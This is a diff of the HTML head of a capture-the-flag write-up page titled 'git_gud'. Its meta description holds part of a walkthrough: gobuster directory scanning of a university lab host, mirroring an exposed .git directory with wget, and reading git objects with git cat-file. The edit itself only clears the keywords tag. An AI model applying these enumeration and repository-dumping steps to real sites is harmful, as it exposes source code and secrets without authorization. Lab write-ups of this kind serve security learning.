@@ -9,7 +9,7 @@
 gobuster -u http://ths.eemcs.utwente.nl:33035/ -w ./SecLists/Discovery/Web-Content/common.txt We discover that the .git dir is exposed
 wget -m http://ths.eemcs.utwente.nl:33035/.git/ git ls-files --stage Scraping in the folders we notice the sha1 of a git object in a file called master, so we read the content
 input: git cat-file -p 8ada2d530c7223ac387dd0ca7de781676a451cc3 output: tree c406e4f12544b6c7e193e6d3cecbc01f91256263 parent 3e7eebf4e038cf713fb74a8101d0c4a03325bd78 author Thijs van Ede thijs@ths." />
-<meta name="keywords" content="homepage, blog" />
+<meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
 <link rel="canonical" href="https://morebaconstrips.github.io/writeups/web/git_gud/" />
